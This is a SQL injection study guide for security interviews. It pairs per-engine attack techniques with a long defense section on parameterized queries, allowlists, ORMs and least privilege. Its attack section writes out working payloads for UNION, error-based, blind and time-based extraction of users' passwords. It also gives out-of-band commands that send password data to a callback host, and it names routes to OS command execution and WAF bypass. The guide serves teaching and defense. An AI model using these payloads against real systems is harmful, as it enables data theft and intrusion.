# SQL Injection

> SQL injection exists because the application builds a query by concatenating attacker-influenced text into a string that the database then parses as code. The database has no way to know which bytes the developer intended as structure (keywords, operators, quotes) and which were meant to be inert data, so a value like `O'Brien` or `' OR 1=1--` is tokenized and executed as SQL. Every technique below is a downstream consequence of that single data-into-code confusion, and the only fix that removes the confusion (rather than trying to sanitize around it) is to send the query structure and the parameter values to the database over separate channels so the values are never on the parse path.

**Interview frequency:** Common

## How it works

A SQL statement passes through the driver to the database engine, which lexes it into tokens, parses those tokens into a syntax tree, plans it, and executes it. Injection happens entirely in the lexing/parsing stage: your input becomes tokens instead of a bound literal. The classic sink:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

with `category=Gifts'--` becomes `... WHERE category = 'Gifts'--' AND released = 1`, where `--` comments out the trailing `AND released = 1`, unhiding unreleased rows. With `Gifts' OR 1=1--` every row matches. On a login query, `administrator'--` as the username returns the admin row and drops the password check entirely.<sup>[[1]](#ref1)</sup>

Injection is not confined to the `WHERE` clause of a `SELECT`. It arises in `UPDATE` values and their `WHERE`, in `INSERT` value lists, in `SELECT` table/column identifiers, and in `ORDER BY` (which cannot be parameterized, so it is a recurring real-world sink). Context also varies by wire format: JSON and XML request bodies get decoded server-side before hitting the interpreter, which is both an injection surface and an obfuscation surface (an XML numeric character reference like `&#x53;ELECT` decodes to `SELECT` after any keyword filter has already run).

Core syntax differs per engine, and knowing the differences is what lets you fingerprint and then pivot.<sup>[[2]](#ref2)</sup> The interview-relevant table:

| Feature | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
| --- | --- | --- | --- | --- | --- |
| Version | `@@version`, `version()` | `version()` | `@@version` | `SELECT banner FROM v$version` | `sqlite_version()` |
| String concat | `CONCAT(a,b)` or `'a' 'b'` | `a || b` | `a + b` | `a || b` | `a || b` |
| Comment | `-- ` (needs trailing space), `#`, `/**/` | `--`, `/**/` | `--`, `/**/` | `--` | `--`, `/**/` |
| Substring | `SUBSTRING(s,pos,len)` | `SUBSTRING(s,pos,len)` | `SUBSTRING(s,pos,len)` | `SUBSTR(s,pos,len)` | `SUBSTR(s,pos,len)` |
| Row source for `SELECT` | optional | optional | optional | must use `FROM dual` | optional |
| Stacked queries | usually no (driver dependent) | yes | yes | no | driver dependent |
| Sleep | `SLEEP(10)` | `pg_sleep(10)` | `WAITFOR DELAY '0:0:10'` | `dbms_pipe.receive_message(('a'),10)` | none native |

Metadata sources also diverge<sup>[[3]](#ref3)</sup>, and this is the specific fact interviewers probe when they ask "how did you know the table names":

```
-- MySQL / PostgreSQL / MSSQL: ANSI information_schema
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- Oracle: no information_schema, use the data dictionary
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';  -- note UPPERCASE

-- SQLite: the schema table holds the raw CREATE DDL (column names inline)
SELECT name, sql FROM sqlite_master WHERE type = 'table';
```

## Quick reference

```
# UNION-based exfiltration, after confirming column count/types via ORDER BY probing
' UNION SELECT username, password FROM users--
# Grafts the users table's username/password columns onto the visible result set;
# the trailing -- comments out whatever the original query appended after the injection point.
```

| Invariant | Where enforced | How violated | Source |
|---|---|---|---|
| Query structure (keywords, operators) is fixed before any value is parsed, never built by string concatenation | Driver/database parse-bind boundary (e.g. PostgreSQL Parse/Bind/Execute, MySQL `COM_STMT_PREPARE`) | `category=Gifts'--` concatenated into the `WHERE` clause turns attacker text into tokens | <sup>[[1]](#ref1)</sup> |
| Non-parameterizable positions (identifiers, `ORDER BY` direction) are mapped through a fixed server-side allowlist, never passed through | Application allowlist mapping | User-controlled sort column/direction passed straight into `ORDER BY`, which cannot be bound as a parameter | <sup>[[6]](#ref6)</sup> |
| Prepared-statement text is a hard-coded constant with true server-side binding, not client-side emulated escaping | Driver configuration (e.g. `PDO::ATTR_EMULATE_PREPARES` false) | Emulated prepares interpolate and escape client-side instead of binding server-side, reopening charset edge cases | <sup>[[6]](#ref6)</sup> |
| Stored procedure bodies bind their own parameters internally rather than building dynamic SQL from concatenated input | Procedure body implementation | `EXEC`/`sp_executesql`/`EXECUTE IMMEDIATE` over concatenated input inside the procedure reintroduces injection one layer down | <sup>[[7]](#ref7)</sup> |
| The application's DB account is least-privileged and scoped to only the tables/operations it needs | DB account provisioning and grants | Escalation via `xp_cmdshell`, `COPY ... TO PROGRAM`, or `LOAD_FILE`/`INTO OUTFILE` depends on privileges a least-privileged account would lack | <sup>[[7]](#ref7)</sup> |
| Verbose database error text is disabled in production so type-conversion errors carry no data | DB/application error-handling config | Error-based injection forces secrets into a type-conversion exception (`CONVERT`, `CAST`, `EXTRACTVALUE`) that the app then renders | <sup>[[7]](#ref7)</sup> |

## Attack techniques

Confirmation comes first. Submit a single quote and watch for an error or a changed response; then prove you can both break and repair the query. A boolean pair that should be logically equivalent to the base value is the cleanest signal: `' AND '1'='1` (returns rows) versus `' AND '1'='2` (returns none). If nothing renders, escalate to time or out-of-band probes below.

### 1. UNION-based (in-band, visible output)

Append a second `SELECT` to graft rows from other tables onto the visible result set.<sup>[[4]](#ref4)</sup> Two prerequisites: equal column count and compatible types per column.

   Column count via incrementing `ORDER BY` until it errors (count is the last value that worked), or via `NULL` padding:

   ```
   ' ORDER BY 1--
   ' ORDER BY 2--        -- keep going until "ORDER BY position N is out of range"
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--   -- until no column-count mismatch error
   ```

   `NULL` is used because it casts to any type, maximizing the chance a match on count succeeds. Then find a string-compatible column by placing a marker in each slot in turn (`' UNION SELECT 'a',NULL,NULL--`); a type-clash raises `Conversion failed when converting the varchar value 'a' to data type int`. On Oracle add `FROM dual`. Exfiltrate:

   ```
   ' UNION SELECT username, password FROM users--
   -- single usable column? concatenate with a separator:
   ' UNION SELECT username || '~' || password FROM users--   -- Oracle/Postgres/SQLite
   ```

   Why it works: `UNION` is a legal set operator, and once your input is on the parse path there is nothing structurally distinguishing your `SELECT` from the developer's.

### 2. Error-based (in-band, leak via exception text)

When the app returns DB errors, force the secret into a type conversion so the engine prints it in the error:

   ```
   -- MSSQL: implicit int conversion prints the string
   ' AND 1=(SELECT 'x' WHERE 1=(SELECT TOP 1 password FROM users))--
   -- MSSQL simpler form
   ' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
   -- PostgreSQL: CAST a string to int
   ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
   -- MySQL: XPath error carries ~32 chars of the payload
   ' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))--
   ```

   MySQL's `EXTRACTVALUE`/`UPDATEXML` errors truncate at roughly 32 characters, so long secrets need `SUBSTRING` windowing across multiple requests.

### 3. Boolean blind (inferential)

No data and no errors, only a rendering difference between true and false.<sup>[[5]](#ref5)</sup> Turn "read a string" into a sequence of yes/no questions with `SUBSTRING` plus a comparison:

   ```
   xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm
   xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 't
   xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) = 's
   ```

   Extraction math: comparing with `>`/`<` is a binary search over the character space. A 7-bit ASCII byte needs `ceil(log2(128)) = 7` requests; a full byte needs 8. That is roughly 7 requests per character versus an average of about 48 for linear equality scanning over printable ASCII, so binary search is an order of magnitude cheaper. Total cost to pull an `L`-character secret is about `7 * L` requests. Comparing on `ASCII()`/`UNICODE()` of the substring keeps the comparison numeric and avoids collation surprises (case-insensitive collations make `=` on letters lie). This character-by-character binary search over a one-bit oracle is exactly what `sqlmap` automates.

### 4. Time-based blind (inferential, no response difference at all)

Make the query sleep only when the condition holds, then infer from latency<sup>[[5]](#ref5)</sup>:

   ```
   -- MSSQL
   '; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'m' WAITFOR DELAY '0:0:10'--
   -- PostgreSQL
   ' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)>'m') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
   -- MySQL
   ' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'m',SLEEP(10),0)--
   -- Oracle
   ' AND 1=(CASE WHEN (...) THEN dbms_pipe.receive_message(('a'),10) ELSE 1 END)--
   ```

   Use a delay long enough to clear network jitter (5 to 10 seconds), and confirm by toggling the condition so a true case is slow and a false case is fast. Time-based is slow and noisy but works through caching and async layers that defeat boolean inference.

### 5. Out-of-band (OAST)

When there is no in-band channel and the query may run asynchronously (so even timing fails), make the database initiate a network callback to infrastructure you control (Burp Collaborator or a DNS logger).<sup>[[5]](#ref5)</sup> DNS is the preferred carrier because egress DNS is almost always permitted. Per engine:

   ```
   -- MSSQL: UNC path triggers SMB/DNS resolution
   '; exec master..xp_dirtree '//SUBDOMAIN.collab.net/a'--
   -- PostgreSQL: shell out via COPY TO PROGRAM
   copy (SELECT '') to program 'nslookup SUBDOMAIN.collab.net';
   -- MySQL (Windows only): UNC in LOAD_FILE or INTO OUTFILE
   ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.collab.net\\a'))--
   -- Oracle (needs privilege / older XXE-in-DB path)
   SELECT UTL_INADDR.get_host_address('SUBDOMAIN.collab.net') FROM dual;
   SELECT UTL_HTTP.request('http://SUBDOMAIN.collab.net/') FROM dual;
   ```

   Data exfiltration folds the secret into the hostname so the whole value arrives in one lookup: MSSQL `declare @p varchar(1024);set @p=(SELECT password FROM users);exec('master..xp_dirtree "//'+@p+'.collab.net/a"')`. OAST is often the preferred blind method even when others work, because it moves the whole secret per request instead of one bit.

### 6. Second-order (stored) SQLi

Input is stored safely on request A (parameterized insert at registration), then later concatenated unsafely into a query on request B (for example a password-change routine that reads the stored username and interpolates it).<sup>[[1]](#ref1)</sup> The source and sink are separated in time and code, so a reviewer looking only at the insert sees nothing wrong and the value is wrongly trusted on retrieval. Register `administrator'--` as a username; the later query built as `... WHERE username = 'administrator'--...` truncates its own logic.

### 7. Beyond reading rows (escalation and RCE per engine)

   - MSSQL: `xp_cmdshell` for direct OS commands (disabled by default but re-enablable with `sp_configure` if the account is privileged); `xp_dirtree`/`xp_fileexist` for SMB/DNS.
   - PostgreSQL: `COPY ... FROM PROGRAM 'cmd'` runs OS commands as the server user; `COPY ... TO/FROM` and the large-object functions read and write files; untrusted PL/pgSQL or a `SECURITY DEFINER` function widens reach.
   - MySQL: `LOAD_FILE()` reads and `SELECT ... INTO OUTFILE`/`INTO DUMPFILE` writes files, both gated by the `FILE` privilege and the `secure_file_priv` path; a common RCE is writing a web shell into the docroot; UDF injection (loading a shared object into the plugin dir) yields code execution.
   - Oracle: no stacked queries, so RCE typically goes through Java stored procedures or `DBMS_SCHEDULER`/`UTL_*` abuse.
   - Stacked queries (`;`) let you run entirely separate statements (INSERT/UPDATE/DROP) where the driver permits them: common on MSSQL and Postgres, generally off on the MySQL C API and thus most PHP/mysqli paths, though occasionally reachable via certain PHP/Python multi-statement APIs.

### 8. WAF and filter bypass (reasoning, not a payload dump)

Blocklists model syntax, not the data/code boundary, so they lose to any transformation that changes the bytes while preserving the parse. Inline comments break token matching (`UN/**/ION SEL/**/ECT`), case variation defeats case-sensitive rules, alternate whitespace substitutes for spaces (`/**/`, `%0b`, `%a0`, parentheses), and quotes can be avoided entirely with hex/`0x` literals or `CHAR()`/`CONCAT()` string building so payloads survive quote filtering. Layered encodings (URL, double-URL, unicode, XML entity, JSON `\u`) exploit the fact that the WAF and the database decode at different stages: the WAF inspects one representation and the engine executes another. The defensive lesson is that every bypass reinforces why parameterization (not filtering) is the control.<sup>[[6]](#ref6)</sup>

## Defense

### Real fix

1. Parameterized queries / prepared statements. This is the real fix, and its effectiveness is structural, not cosmetic.<sup>[[6]](#ref6)</sup> The driver sends the statement text with placeholders to the server, which parses and plans it once; the parameter values travel separately and are bound to slots in the already-compiled plan, so they are never lexed as SQL. Concretely, PostgreSQL's extended query protocol uses distinct `Parse`, `Bind`, and `Execute` messages, and MySQL uses `COM_STMT_PREPARE` followed by `COM_STMT_EXECUTE` with values in the binary protocol. Because the parse tree is fixed before any value arrives, `' OR 1=1--` supplied as a parameter is searched for as a literal string, not interpreted.

   ```java
   // Java JDBC
   PreparedStatement ps = conn.prepareStatement(
       "SELECT account_balance FROM user_data WHERE user_name = ?");
   ps.setString(1, custname);
   ```

   ```csharp
   // C# ADO.NET
   var cmd = new SqlCommand("SELECT ... WHERE user_name = @name", conn);
   cmd.Parameters.Add(new SqlParameter("@name", customerName));
   ```

   Critical caveat: the statement string must be a hard-coded constant, never built by concatenation "for the safe cases". Also beware emulated prepared statements: PHP PDO with `PDO::ATTR_EMULATE_PREPARES` true (historically the default for MySQL) does client-side interpolation with escaping rather than true server-side binding, which reintroduces charset and edge-case risk. Set it false to force real server-side prepares.

2. Safe stored procedures. Equivalent to prepared statements only if the procedure body itself uses bound parameters and does not build dynamic SQL with `EXEC`/`sp_executesql`/`EXECUTE IMMEDIATE` over concatenated input. Auditors specifically grep procedure bodies for those dynamic-execution calls. Note a tradeoff the OWASP cheat sheet flags<sup>[[7]](#ref7)</sup>: forcing all access through procedures can push the app account up to `db_owner` (procedures need EXECUTE), which enlarges blast radius if breached.

3. Allowlist for non-parameterizable positions. Identifiers (table and column names) and `ORDER BY` direction cannot be bound. Map user choice to a fixed server-side set:

   ```java
   switch (param) {
     case "date":  col = "created_at"; break;
     case "name":  col = "display_name"; break;
     default: throw new ValidationException("bad sort key");
   }
   String dir = ascending ? "ASC" : "DESC";   // derive from a boolean, never pass through
   ```

4. ORMs. Idiomatic ORM use parameterizes by default. The risk lives in the raw-query escape hatches and in helpers that build fragments by concatenation: Django `.raw()` / `.extra()` / `RawSQL`, SQLAlchemy `text()` with f-string interpolation, Sequelize `sequelize.query()` / `sequelize.literal()`, Hibernate/JPA string-built HQL/JPQL (HQL injection, CWE-564), Rails `where("name = '#{x}'")` and order/pluck built from params, and Node driver `.query(`... ${x}`)` template literals. Use the ORM's bind-parameter form (`:name`, `?`, replacements map) in every one of these.

**Parameterized queries vs stored procedures vs ORMs: when to use which.** All three enforce the same invariant when used correctly (user data never reaches the parser as SQL text), so the choice is not about injection prevention per se, it is about where the query lives, who owns it, and what secondary properties you get.

**Parameterized queries in application code.** The default answer for almost every web-app CRUD path. Query lives in application source, versioned with the code, reviewable in normal PRs, testable with the same test harness as the rest of the code. The DB account can be least-privileged (SELECT/INSERT/UPDATE on specific tables). The failure mode is that the application layer must remember to parameterize every single query, and one concatenated string in a hotfix reintroduces the class. Choose this when: the app team owns the schema, most queries are single-table CRUD, and you want database changes to move through the same review pipeline as code.

**Stored procedures.** Choose these when a specific value proposition applies, not by default. The four legitimate reasons to reach for stored procedures over parameterized queries are (a) *schema encapsulation*: the DBA team owns the schema and exposes only procedure signatures to the app team, so the app cannot issue arbitrary SELECT/UPDATE (this is the classic large-enterprise pattern where the app account has EXECUTE on procedures and no direct table grants); (b) *fine-grained authorization gating*: the procedure can enforce row-level or business-rule checks in a place the app cannot bypass, useful when multiple apps hit the same database; (c) *performance*: pre-compiled plans matter for very hot queries on some engines (mostly historical on modern optimizers with plan caching); (d) *transactional atomicity*: multi-statement business operations that must be atomic and involve temp tables or cursors read better as one procedure than as five app-side calls in a transaction. The failure modes are that stored procedures are versioned outside the application repo (schema migrations must ship them, and drift between environments is easy), they are harder to unit-test, and forcing everything through them commonly ends with the app account holding broader DB-object privileges than it would with parameterized queries (see the OWASP cheat sheet's note that procedure-heavy designs tend to push accounts toward `db_owner`<sup>[[7]](#ref7)</sup>).

**ORMs.** Choose these when the app is CRUD-heavy and the team benefits from schema-object mapping, migrations, and lazy loading; the ORM parameterizes for free via its query builder. The failure mode is that any raw-query escape hatch (Django `.raw()`, SQLAlchemy `text()` with f-strings, Rails `.where("name = '#{x}'")`) reintroduces injection with no warning; the reviewer must know to grep for those APIs. ORMs also cannot bind identifiers or ORDER BY direction, so those still need an allowlist mapping regardless.

**The correct answer at interview** to "when do you use parameterized queries vs stored procedures" is that the injection-prevention question is the same for both (both enforce the parser boundary if the procedure body itself uses bound parameters); the real decision is architectural. Parameterized queries when the app owns the schema and you want queries in the code review path. Stored procedures when the DB team owns the schema, when you need fine-grained authz gating enforced below the app, or when the operation is genuinely one atomic multi-statement unit. The wrong-shaped answer is "stored procedures are safer" (they are not, they are equivalent when written correctly and worse when they build dynamic SQL with `EXEC`/`sp_executesql`/`EXECUTE IMMEDIATE`) or "you must pick one and use it everywhere" (real systems use both: parameterized queries for the 95% CRUD case, stored procedures for the 5% where the value props above apply).

### Defense in depth

1. Least privilege (caps damage, does not prevent injection). Give each app a dedicated account scoped to only the tables it needs, read-only where possible, without `FILE`/`xp_cmdshell`/`COPY ... PROGRAM`, and never `sa`/`root`/DBA. Run the DBMS OS process as a restricted user (MySQL historically ran as SYSTEM on Windows). Use views to expose only necessary columns, for example a view returning only the password hash so a successful dump cannot reach the raw table. Different web apps should use different DB users so a login page needs only read and a signup page only insert.

2. Allowlist input validation (type, length, format) as a secondary check, disable verbose DB errors in production (kills error-based and slows enumeration), disable stacked queries where the driver allows, and treat a WAF as a speed bump for spraying tools rather than a control. OWASP explicitly ranks escaping all input as a last-resort, strongly discouraged option<sup>[[7]](#ref7)</sup> because it is fragile and bypassable.

## Interviewer probes

**Doesn't escaping quotes fix SQL injection?**

Mid: Escaping helps but isn't a complete fix, since it's easy to miss a context or a DBMS-specific edge case; parameterized queries are the recommended approach because they don't rely on catching every dangerous character.

Principal: No. Numeric contexts have no quote to escape, so `id=1 OR 1=1` needs none at all. Second-order injection stores an already-escaped value that gets un-escaped on the later read, defeating the escaping that ran at write time. Multibyte charset tricks (the classic GBK `%bf%27`) can consume the escape backslash itself. Parameterization is the real fix precisely because it doesn't depend on catching characters; the value never reaches the parser as SQL text in the first place.

**We use an ORM, so we're not exposed to SQL injection, right?**

Mid: Mostly, but not entirely. The ORM's query builder is safe, but any raw or native query method it exposes can still be injectable if it's built with string concatenation.

Principal: Only until someone reaches for the raw-query escape hatch or builds `ORDER BY` from a request parameter. Django `.raw()`/`.extra()`, SQLAlchemy `text()` with f-strings, Sequelize `sequelize.query()`, and Rails `where("name = '#{x}'")` all reintroduce the class with no compiler warning. ORMs also cannot bind identifiers or sort direction, so those still need an explicit allowlist regardless of ORM usage.

**If we move all data access into stored procedures, are we safe from SQL injection?**

Mid: Not automatically. It depends on how the procedure is written; if it concatenates input into a dynamic SQL string internally, it can still be injectable.

Principal: Only if the procedure body itself uses bound parameters. A procedure that builds dynamic SQL internally with `EXEC`/`sp_executesql`/`EXECUTE IMMEDIATE` over concatenated input is injection one layer down, just harder to spot in review because the vulnerable string-building is now inside the database rather than the app. Stored procedures are architecturally equivalent to parameterized queries when written correctly, not inherently safer.

**Since we use parameterized queries everywhere, are all our SQL injection risks closed?**

Mid: Mostly, but things like table/column names or sort direction can't be passed as bind parameters, so any place that builds those dynamically still needs to be checked.

Principal: Not the ones that can't be parameterized. `ORDER BY` direction, `LIMIT`/`TOP` values, and identifiers (table and column names) cannot be bound as parameters in standard drivers. A senior answer names the server-side allowlist mapping for those positions rather than claiming binds cover everything; that gap is exactly where reviewers still find real injection in codebases that otherwise parameterize correctly.

**If a SQL injection is blind and never reflects data, is it lower severity than an in-band one?**

Mid: It's harder to exploit since there's no direct output to read from, but it can still be used to extract data one bit at a time, so it shouldn't be rated lower just because it's blind.

Principal: No, only slower to exploit manually, and automation (sqlmap-style binary search) makes that difference cosmetic. A blind boolean or time-based injection reaches the same data and the same escalation paths (stacked queries, `xp_cmdshell`, `COPY ... PROGRAM`) as a UNION-based one; don't downgrade a finding just because the response doesn't visibly change.

**We use prepared statements everywhere, so we're covered on data access, right?**

Mid: Prepared statements cover injection, but you still need separate authorization checks in the query or application logic to make sure a user can only access their own data.

Principal: Prepared statements defend against injection, not against a query that is logically over-privileged. Authorization is a separate control: a fully parameterized query with no tenant or owner predicate in the `WHERE` clause can still return another user's rows on demand. Interviewers ask this specifically to see whether a candidate conflates "the query is syntactically safe" with "the query is correctly scoped to the caller."

**Does SQL injection have an equivalent in NoSQL databases?**

Mid: Yes, it's usually called NoSQL injection: passing JSON operators like `$ne` or `$gt` instead of a plain value can change what the query matches.

Principal: Yes, same data-into-code root cause with different syntax: operator injection like `{"$ne": ""}` or `{"$gt": ""}` in a JSON body reshapes the query logic, and `$where` allows arbitrary JavaScript evaluation on some engines. The fix rhymes with the relational case: keep user data out of the query structure, and reject query operators when a value position is expected.

## Sources

<a id="ref1"></a>[1] PortSwigger Web Security Academy, "SQL injection". Retrieved 2026. https://portswigger.net/web-security/sql-injection

<a id="ref2"></a>[2] PortSwigger, "SQL injection cheat sheet" (per-DBMS syntax). Retrieved 2026. https://portswigger.net/web-security/sql-injection/cheat-sheet

<a id="ref3"></a>[3] PortSwigger, "Examining the database". Retrieved 2026. https://portswigger.net/web-security/sql-injection/examining-the-database

<a id="ref4"></a>[4] PortSwigger, "SQL injection UNION attacks". Retrieved 2026. https://portswigger.net/web-security/sql-injection/union-attacks

<a id="ref5"></a>[5] PortSwigger, "Blind SQL injection". Retrieved 2026. https://portswigger.net/web-security/sql-injection/blind

<a id="ref6"></a>[6] OWASP, "Query Parameterization Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html

<a id="ref7"></a>[7] OWASP, "SQL Injection Prevention Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
